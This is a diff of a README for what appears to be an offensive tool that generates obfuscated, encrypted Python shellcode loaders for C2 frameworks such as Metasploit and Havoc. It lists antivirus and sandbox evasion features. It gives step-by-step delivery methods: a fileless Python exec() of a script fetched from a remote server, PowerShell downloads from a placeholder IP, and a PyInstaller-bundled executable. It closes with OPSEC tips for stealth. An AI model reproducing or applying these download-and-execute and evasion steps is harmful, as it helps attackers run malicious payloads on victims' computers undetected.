@@ -6,10 +6,12 @@ It generates an obfuscated and encrypted shellcode loader (Python script) that i
 #### FEATURES
   - Shellcode injection into the memory of the current process (Python)
   - Shellcode encryption (XOR) and compression (Zlib)
-  - Script obfuscation (function and variable names are randomized + multiple encoding layer)
   - Dynamic API resolution (via GetProcAddress and LoadLibraryA)
   - Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
   - Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
+  - Script obfuscation + Reflective code loading
+    - function and variable names are randomized
+    - the output Python script contains a base64 encoded version of the "real" obfuscated shellcode loader script (embeding the encrypted shellcode) that will be reflectively loaded in-memory
   - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc
 
 #### USAGE
@@ -19,38 +21,65 @@ Example:
 C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shellcode.txt" ".\obfuscated_shellcodeloader.py"
 ```
 
-- STEP 2. On the target Windows machine if Python is not already installed, download the Python embeddable package which provides a signed (portable) Python interpreter with a good reputation.
+- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer
+
+  - Option A: Use of a portable signed Python (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
 ```
-Example:
-PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
-PS C:\temp> tar -xf .\python.zip
+1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
+    Example:
+    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+    PS C:\temp> tar -xf .\python.zip
+
+2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Python.
+    This fileless delivery technique enhances stealth and helps evade static antivirus detection.
+    Example:
+    --------
+    C:\temp\python> type .\Python-fileless-delivery.py
+    #Python3
+    import urllib.request
+    request = urllib.request.Request('http://website/obfuscated_shellcodeloader.py')
+    result = urllib.request.urlopen(request)
+    payload = result.read()
+    exec(payload)
+
+    C:\temp\python> python.exe .\Python-fileless-delivery.py 
+```
+  - Option B: Use of a portable signed Python (www.python.org) + Download locally the obfuscated shellcode loader (Python script) prior to execution
+```
+1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
+    Example:
+    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+    PS C:\temp> tar -xf .\python.zip
+
+2 - Download and store the obfuscated shellcode loader script locally on disk prior to execution with Python.
+    The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
+    Example:
+    --------
+    C:\temp\python> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.py -OutFile C:\temp\python\obfuscated_shellcodeloader.py"
+    C:\temp\python> python.exe .\obfuscated_shellcodeloader.py
+```
+  - Option C: Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
+```
+1 - Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe)
+    Example:
+    --------
+    C:\Users\auditor\Documents> pip install pyinstaller
+    C:\Users\auditor\Documents>  python3 -m pip install --upgrade pip
+    C:\Users\auditor\Documents\python\pyinstaller-test> python3 -m PyInstaller -F script.py -i "file.ico" --noconsole
+    C:\Users\auditor\Documents\python\pyinstaller-test> dir dist
+    09/04/2025  11:54 PM         5,612,531 script.exe
+
+2 - Download and execute the obfuscated shellcode loader "script.exe" on a target Windows computer
+    The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
+    Example:
+    --------
+    C:\temp> powershell -c "wget -uri http://X.X.X.X/script.exe -OutFile C:\temp\script.exe"
+    C:\temp> script.exe
 ```
 
-- STEP 3. Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Python. 
-  - This fileless delivery technique enhances stealth and helps evade static antivirus detection.
-```
-Example:
---------
-C:\temp\python> type .\Python-fileless-delivery.py
-
-#Python3
-import urllib.request
-request = urllib.request.Request('http://website/obfuscated_shellcodeloader.py')
-result = urllib.request.urlopen(request)
-payload = result.read()
-exec(payload)
-
-C:\temp\python> python.exe .\Python-fileless-delivery.py 
-```
-   - Alternatively, you may download and store the obfuscated shellcode loader script locally on disk prior to execution with Python. The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
-```
-Example:
---------
-C:\temp\python> python.exe .\obfuscated_shellcodeloader.py
-```
-
-#### OPSEC advice
-Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
+#### OPSEC advices
+- Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
+- When possible use fileless delivery technique to enhance stealth and helps evade static antivirus detection.
   
 #### LICENSE
   - GNU General Public License v3.0
